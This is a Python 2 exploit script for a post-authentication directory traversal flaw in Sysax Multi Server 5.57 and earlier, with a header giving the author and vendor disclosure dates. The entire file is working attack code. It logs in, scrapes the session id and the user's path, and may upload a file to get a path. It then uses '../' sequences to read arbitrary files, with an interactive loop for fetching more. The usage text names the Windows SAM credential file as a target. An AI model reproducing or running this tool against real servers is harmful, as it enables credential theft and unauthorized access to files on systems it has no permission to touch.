#!/usr/bin/python
##########################################################################################################
#Title: Sysax Multi Server <= 5.57 Directory Traversal Tool (Post Auth)
#Author: Craig Freyman (@cd1zz)
#Tested on: XP SP3 32bit and Server 2003 SP2 32bit
#Date Discovered: March 27, 2012
#Vendor Contacted: March 29, 2012
#Vendor Response: April 3, 2012  
#Vendor Fixed: (Currently working on fix, check my site for update)
#Details: http://www.pwnag3.com/2012/04/sysax-directory-traversal-exploit.html
##########################################################################################################

import socket,sys,time,re,base64,urllib

def main():
  #base64 encode the provided creds
  creds = base64.encodestring(user+"\x0a"+password)

  print "\n"
  print "****************************************************************************"
  print "       Sysax Multi Server <= 5.57 Directory Traversal Tool (Post Auth)      "
  print "                    by @cd1zz www.pwnag3.com                          "
  print "          Getting "+getfile+" from " + target + " on port " + str(port) 
  print "****************************************************************************"

  #setup post for login
  login = "POST /scgi?sid=0&pid=dologin HTTP/1.1\r\n"
  login += "Host: \r\n"
  login += "http://"+target+"/scgi?sid=0&pid=dologin\r\n"
  login += "Content-Type: application/x-www-form-urlencoded\r\n"
  login += "Content-Length: 15\r\n\r\n"
  login += "fd="+creds+"\n\n"

  #send post and login creds
  try:
    r = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    r.connect((target, port))
    print "[*] Logging in"
    r.send(login)
  except Exception, e:
    print "[-] Could not login"
    print e
  
  #loop the recv sock so we get the full page
  page = ''  
  fullpage = ''  
  while "</html>" not in fullpage:
    page = r.recv(4096)
    fullpage += page
  time.sleep(1)

  #regex the sid from the page
  global sid
  sid = re.search(r'sid=[a-zA-Z0-9]{40}',fullpage,re.M)
  if sid is None:
    print "[x] Could not login. User and pass correct?"
    sys.exit(1)
  time.sleep(1)

  #regex to find user's path
  print "[*] Finding your home path"
  global path
  path = re.search(r'file=[a-zA-Z]:\\[\\.a-zA-Z_0-9 ]{1,255}[\\$]',fullpage,re.M)
  time.sleep(1)

  #if that doesn't work, try to upload a file and check again
  if path is None:
    print "[-] No files found, I will try to upload one for you."
    print "[-] If you don't have rights to do this, it will fail."

    upload = "POST /scgi?"+str(sid.group(0))+"&pid=uploadfile_name1.htm HTTP/1.1\r\n"
    upload += "Host:\r\n"
    upload += "Content-Type: multipart/form-data; boundary=---------------------------97336096252362005297691620\r\n"
    upload += "Content-Length: 219\r\n\r\n"
    upload += "-----------------------------97336096252362005297691620\r\n"
    upload += "Content-Disposition: form-data; name=\"upload_file\"; filename=\"file.txt\"\r\n"
    upload += "Content-Type: text/plain\r\n"
    upload += "-----------------------------97336096252362005297691620--\r\n\r\n"

    u = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    u.connect((target, port))
    u.send(upload + "\r\n")
    page = ''
    fullpage = ''  
    while "</html>" not in fullpage:
      page = u.recv(4096)
      fullpage += page
    path = re.search(r'file=[a-zA-Z0-9]:\\[\\.a-zA-Z_0-9 ]{1,255}[\\$]',fullpage,re.M)
    time.sleep(2)
    if path is None:
      print "\n[x] It failed, you probably don't have rights to upload."
      print "[x] Please retry the script a few times."
      print "[x] You need at least one file in the directory because we need" 
      print "[x] to append our directory traversal to the end of your path."
      sys.exit(1)
  print "[+] Got it => " + path.group(0) 
  time.sleep(1)
  r.close()

def dirtrav():
  #here is the dir trav 
  url = "http://"+target+"/scgi?"+str(sid.group(0))+"&"+path.group(0)+"../../../../../../../"+getfile
  try:
    retrieved_file = urllib.urlopen(url)
    filename = raw_input("[+] Got your file. What file name do you want to save it as?  ")
    output = open(filename,'wb')
    output.write(retrieved_file.read())
    output.close()
    print "[*] Done!"
  except Exception, e:
    print "[x] Either the file doesn't exist or you mistyped it. Error below:"
    print "[x] You can also try to browse this site manually:"
    print "[x] " + url
    print e

def keepgoing():
  cont = raw_input("[*] Do you want another file (y/n)? ")
  while cont == "y":
    global getfile
    getfile = raw_input("[*] Enter the location of the new file: ")
    dirtrav()
    cont = raw_input("[*] Do you want another file (y/n)? ")
  else:
    sys.exit(1) 
  
if __name__ == '__main__':
  if len(sys.argv) != 6:
    print "[+] Usage: ./filename <Target IP> <Port> <User> <Password> <File>"
    print "[+] File examples => windows/repair/sam or boot.ini"
    sys.exit(1)

  target, port, user, password, getfile = sys.argv[1], int(sys.argv[2]), sys.argv[3], sys.argv[4], sys.argv[5]
  
  main()
  dirtrav()
  keepgoing()
